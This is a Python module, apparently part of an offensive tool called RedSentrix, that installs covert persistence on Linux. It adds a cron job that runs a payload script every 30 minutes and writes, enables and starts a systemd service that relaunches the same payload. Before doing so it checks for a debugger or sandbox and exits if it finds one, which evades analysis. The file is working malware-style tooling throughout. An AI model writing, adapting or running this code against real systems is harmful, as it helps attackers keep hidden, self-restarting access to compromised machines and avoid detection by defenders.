import os
import sys
import subprocess
from redsentrix_core.stealth_utils import StealthUtils

def is_linux():
    return sys.platform.startswith("linux")

def add_cron_job(command: str):
    try:
        # Add a cron job to run every 30 minutes
        cron_job = f"*/30 * * * * {command}\n"
        # Read existing crontab
        existing = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        cron_tab = existing.stdout if existing.returncode == 0 else ""
        if cron_job not in cron_tab:
            cron_tab += cron_job
            proc = subprocess.run(['crontab', '-'], input=cron_tab, text=True)
            if proc.returncode == 0:
                print("[+] Cron job added.")
            else:
                print("[-] Failed to add cron job.")
        else:
            print("[*] Cron job already present.")
    except Exception as e:
        print(f"[-] Exception adding cron job: {e}")

def add_systemd_service(service_name: str, exec_path: str):
    service_file = f"/etc/systemd/system/{service_name}.service"
    service_contents = f"""[Unit]
Description=RedSentrix Persistence Service

[Service]
ExecStart={exec_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    try:
        with open(service_file, 'w') as f:
            f.write(service_contents)
        subprocess.run(['systemctl', 'daemon-reload'], check=True)
        subprocess.run(['systemctl', 'enable', service_name], check=True)
        subprocess.run(['systemctl', 'start', service_name], check=True)
        print("[+] systemd service installed and started.")
    except Exception as e:
        print(f"[-] Failed to install systemd service: {e}")

def run():
    if not is_linux():
        print("[-] This module is for Linux only.")
        return

    if StealthUtils.is_debugger_present():
        print("[-] Debugger detected, exiting.")
        return

    if StealthUtils.sandbox_check():
        print("[-] Sandbox detected, exiting.")
        return

    # Example payload path
    payload_path = "/usr/local/bin/payload.sh"

    # Persistence methods
    add_cron_job(payload_path)
    add_systemd_service("redsentrix_persistence", payload_path)

    print("[+] Linux Covert Persistence Complete.")
